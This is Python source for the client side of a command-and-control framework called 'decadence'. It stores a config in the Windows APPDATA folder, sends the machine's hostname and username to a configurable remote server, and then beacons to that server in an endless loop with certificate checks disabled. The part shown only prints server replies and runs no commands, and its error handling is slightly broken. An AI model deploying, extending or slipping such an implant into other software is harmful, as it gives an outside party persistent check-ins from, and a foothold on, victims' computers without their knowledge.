import argparse
import requests
import uuid
import json
import os
from time import sleep

'''

decadence client
-----------------

python version of decadence c2 client - 

- run file with server & port arguments to configure client

- once client is configured arguments are not required 

- to recreate client config, use arguments again 

'''


class Decaclient:

    def __init__(self):

        parser = argparse.ArgumentParser(description="decadence c2 client")

        parser.add_argument("--server", type=str,
                            help="server address")

        parser.add_argument("--port", type=int,
                            help="port address")

        parser.add_argument("--https", action="store_true",
                            help="use https")

        parser.add_argument("--delete", action="store_true",
                            help="delete client config")

        parser.add_argument("--conf", action="store_true",
                            help="display current config")

        parser.add_argument("--run", action="store_true",
                            help="start the client")
        
        parser.add_argument("--timeout", type=int,
                            help="beacon timeout - default 30s")

        self.args = parser.parse_args()

        # client config file path
        self.client_file_path = os.path.join(
            os.getenv('APPDATA'), "decadence.json")

        # if delete switch is true, delete config & exit
        if self.args.delete:
            print("deleting config...")
            try:
                os.remove(self.client_file_path)
            except FileNotFoundError:
                print("config does not exist.")
            finally:
                exit()

        # https selected
        if self.args.https:
            self.http = "https"
        else:
            self.http = "http"
        
        if self.args.timeout:
            self.timeout = self.args.timeout
        else:
            self.timeout = 30

        # if both arguments have been supplied create config
        if self.args.server and self.args.port:
            print("creating config file...")
            self.create_client_config()

        # check if client config exists
        if os.path.isfile(self.client_file_path):
            print("loading client config...")
            with open(self.client_file_path, "r") as config_file:
                self.cdata = json.load(config_file)
                self.url = f"{self.cdata['http']}://{self.cdata['server']}:{self.cdata['port']}"
            if self.args.conf:
                print(self.cdata)
        else:
            print(
                "client config does not exist! - create config with --server --port arguments")

        # Check client is registered with the server & start
        if self.args.run:
            self.check_client()

    def create_client_config(self):
        # generate a unique id for client config
        unique_id = str(uuid.uuid1())
        # get hostname
        hostname = os.getenv("COMPUTERNAME")
        # get username
        username = os.getenv("USERNAME")
        # write client config settings to appdata
        with open(self.client_file_path, "w") as clientfile:
            cdata = {"clientid": unique_id,
                     "server": self.args.server,
                     "port": self.args.port,
                     "hostname": hostname,
                     "username": username,
                     "http": self.http,
                     "timeout": self.timeout }
            clientfile.write(json.dumps(cdata))

    # this create a client file on the server if it does not already exist
    def check_client(self):
        # append the api path to the url
        cc_url = self.url + "/api/v1/add-client"
        # try to connect to the server and create client
        try:
            r = requests.get(cc_url, verify=False, params=self.cdata)
        except Exception:
            print("could not connect to server.")
            exit()
        if r.status_code == 200:
            print("connection successful")
            data = r.json()
            # display whether client was created or already existed
            if data["client"] == "created":
                print(f"{self.cdata['clientid']} created on server.")
            elif data["client"] == "exists":
                print(f"{self.cdata['clientid']} already exists.")
            self.dec_beacon()
    
    def dec_beacon(self):
        c2_url = self.url + "/api/v1/beacon"
        while True:
            try:
                r = requests.get(c2_url, verify=False, params=self.cdata)
            except Exception:
                sleep(self.cdata['timeout'])
            if r.status_code == 200:
                print(r.json())
            sleep(self.cdata['timeout'])
            


if __name__ == "__main__":
    client = Decaclient()